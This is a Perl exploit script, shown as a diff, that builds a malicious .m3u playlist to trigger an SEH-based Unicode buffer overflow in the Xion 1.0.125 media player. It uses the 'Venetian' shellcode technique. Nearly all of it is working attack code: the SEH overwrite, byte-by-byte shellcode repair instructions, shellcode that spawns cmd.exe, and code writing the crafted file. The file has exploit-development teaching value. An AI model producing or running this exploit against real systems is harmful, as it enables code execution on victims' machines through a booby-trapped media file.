@@ -1,0 +1,177 @@
+#!/usr/bin/perl
+# ########################################################################
+# Title:                Xion 1.0.125 (.m3u File) Local SEH-based Unicode The “Venetian” Exploit
+# Vulnerability Type:   Execute Code, Overflow UTF-16LE buffer, Memory corruption
+# Date:                 Feb 18, 2018
+# Author:               James Anderson (synthetic)
+# Original Advisory:    http://www.exploit-db.com/exploits/14517 (hadji samir) Published: 2010-07-31
+# Exploit mitigation:   There is no /SAFESEH, SEHOP, /GS, DEP, ASLR
+# About:		The technique is taken from that paper: Creating Arbitrary Shellcode In Unicode Expanded Strings Chris Anley
+# Tested on:            Win NT 5.1.2600 EN: Windows XP SP3 Eng Pro, Intel x86-32
+# ########################################################################
+#                   _   _          _   _      
+#   ___ _   _ _ __ | |_| |__   ___| |_(_) ___ 
+#  / __| | | | '_ \| __| '_ \ / _ \ __| |/ __|
+#  \__ \ |_| | | | | |_| | | |  __/ |_| | (__ 
+#  |___/\__, |_| |_|\__|_| |_|\___|\__|_|\___|
+#	|___/                                         
+#
+# ########################################################################
+                                          
+ my $path = "/media/s4/DragonR.m3u";
+
+ my $buffer_length = 5000;
+ my $suboffset = 0x104;
+ my $NOP1 = "\x6F"; # add [edi], ch
+ my $NOP2 = $NOP1."\x59"; # add [edi], ch # pop ecx
+
+ # [0] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Offset to SEH frame
+ my $crash = "A" x 260;
+ # [1] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Set SEH frame
+ $crash .= "\x61".$NOP1; # popad # NOP-eq; nSEH; popad puts an address close to the buffer in EAX
+ $crash .= "\x79\x41"; # pop r32 pop r32 ret; SEh. address for no /SAFESEH / SEHOP, DEP, ASLR
+
+ my $offset_to_payload = length($crash);
+
+ # [2] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ settingcode. 
+	# [2.0] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ set ecx=2 and eax -> [shellcode]
+ 	$crash .= $NOP1; # NOP-eq
+ 	$crash .= "\x6a\x59"; # push 0 # pop ecx
+	$crash .= $NOP1; # NOP-eq
+ 	$crash .= "\x41"; # inc ecx
+	$crash .= "\xCC"; # add ah, cl # eax = eax + 0x100
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\x41"; # inc ecx
+	$crash .= "\xC8"; # add al, cl
+	$crash .= "\xC8"; # add al, cl # eax = eax+2+2;# and as a result: eax = eax + $suboffset(0x104) # EAX -> SC;
+
+	# [2.1] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ we're correcting the first BAD character 
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x3b\x41"; # mov edx, 41003b00
+	$crash .= "\x30"; # add [eax],dh		 
+	$crash .= $NOP1; # NOP-eq
+
+	# [2.2] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ the second byte and the first 00
+	$crash .= "\x40"; # inc eax
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\xec\x41"; # mov edx, 4100ec00
+	$crash .= "\x30"; # add [eax],dh		
+
+	# [2.3] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ the fourth byte 00. BAD char
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x45\x41"; # mov edx, 41004500 
+	$crash .= "\x30"; # add [eax],dh
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x46\x41"; # mov edx, 41004600 
+	$crash .= "\x30"; # add [eax],dh
+
+	# [2.4] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x68\x41"; # mov edx, 41006800 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.5] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x78\x41"; # mov edx, 41007800 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.6] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x2F\x41"; # mov edx, 41002F00 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.7] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x63\x41"; # mov edx, 41006300 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.8] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x64\x41"; # mov edx, 41006400 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.8] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x8d\x41"; # mov edx, 41008d00 
+	$crash .= "\x30"; # add [eax],dh 
+
+	# [2.9] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\xf8\x41"; # mov edx, 4100f800 
+	$crash .= "\x30"; # add [eax],dh
+
+	# [2.10] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\xb8\x41"; # mov edx, 4100b800 
+	$crash .= "\x30"; # add [eax],dh
+
+	# [2.11] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x49\x41"; # mov edx, 41004900 
+	$crash .= "\x30"; # add [eax],dh
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x4A\x41"; # mov edx, 41004A00 
+	$crash .= "\x30"; # add [eax],dh
+
+	# [2.12] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\x77\x41"; # mov edx, 41007700 
+	$crash .= "\x30"; # add [eax],dh
+
+	# [2.13] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	$crash .= "\xC8"; # add al, cl # eq eax + 2
+	$crash .= $NOP1; # NOP-eq
+	$crash .= "\xba\xd0\x41"; # mov edx, 4100d000 
+	$crash .= "\x30"; # add [eax],dh
+
+ # [3] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # -4: one more NOP below # -8: sizeof(SEHframe) 
+	 						 # *2: for UTF-16 # /4: 2 for UTF-16 and 2 for the 2-byte-NOP
+ $crash .= $NOP2 x (($suboffset - 4 - 8 - (length($crash)*2 - $offset_to_payload*2))/4); # NOP-eq + pop ecx
+ $crash .= $NOP1."\x6A"; # NOP1 + NOP1-eq (push 0)
+
+
+ # [4] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shellcode. left - ^jalousie; right - actual shellcode that will be crafted. CMD=cmd.exe
+my $shellcode =
+"\x50".	# "\x8b". #	# BAD BYTE
+	# "\xec". # 0
+"\x55".	# "\x55".
+	# "\x8b". # 0	# BAD BYTE  
+"\xec".	# "\xec".
+	# "\x68". # 0
+"\x65".	# "\x65".
+	# "\x78". # 0
+"\x65".	# "\x65".
+	# "\x2F". # 0
+"\x68".	# "\x68".
+	# "\x63". # 0
+"\x6d".	# "\x6d".
+	# "\x64". # 0
+"\x2e".	# "\x2e".
+	# "\x8d". # 0
+"\x45".	# "\x45".
+	# "\xf8". # 0
+"\x50".	# "\x50".
+	# "\xb8". # 0
+"\xc7".	# "\xc7".
+	# "\x93". # 0	# BAD BYTE  
+"\xc2".	# "\xc2".
+	# "\x77". # 0
+"\xff";	# "\xff".
+	# "\xd0"; # 0
+
+ $crash .= $shellcode;
+
+ $crash .= "C" x ($buffer_length - length($crash));
+ open(myfile, ">$path"); 
+ print myfile $crash;
